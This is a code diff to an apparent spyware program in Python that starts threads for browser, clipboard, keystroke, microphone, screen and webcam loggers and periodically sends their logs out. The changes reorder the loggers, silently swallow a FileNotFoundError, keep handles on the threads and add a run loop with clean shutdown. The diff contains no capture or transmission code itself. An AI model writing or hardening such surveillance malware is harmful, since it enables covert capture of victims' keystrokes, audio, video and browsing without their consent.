@@ -23,7 +23,7 @@ def send_all_logs(loggers):
             try:
                 logger.send_logs()
             except FileNotFoundError:
-                log_error("File not found error in send_logs")
+                pass
             except Exception as e:
                 log_error(f"Unexpected error in send_logs: {e}")
             time.sleep(1)
@@ -33,19 +33,23 @@ def send_all_logs(loggers):
 
 def create_loggers():
     loggers = [
-        BrowserLogger(),
-        ClipboardLogger(),
-        InputLogger(),
         MicrophoneLogger(),
         ScreenLogger(),
         WebcamLogger(),
+        BrowserLogger(),
+        ClipboardLogger(),
+        InputLogger(),
     ]
     return loggers
 
 
 def start_loggers(loggers):
+    threads = []
     for logger in loggers:
-        threading.Thread(target=logger.run).start()
+        thread = threading.Thread(target=logger.run)
+        thread.start()
+        threads.append(thread)
+    return threads
 
 
 def startup_message():
@@ -56,12 +60,30 @@ def startup_message():
 
 
 def main():
-    startup_message()
-    create_log_directories()
-    loggers = create_loggers()
-    start_loggers(loggers)
-    threading.Thread(target=send_all_logs, args=(loggers,)).start()
+    try:
+        startup_message()
+        create_log_directories()
+        loggers = create_loggers()
+        logger_threads = start_loggers(loggers)
+        send_logs_thread = threading.Thread(target=send_all_logs, args=(loggers,))
+        send_logs_thread.start()
+
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        for logger in loggers:
+            logger.running = False
+
+        for thread in logger_threads:
+            thread.join()
+
+        send_logs_thread.join()
+
+    except Exception as e:
+        log_error(e)
+        return 1
+    return 0
 
 
 if __name__ == "__main__":
-    main()
+    exit(main())
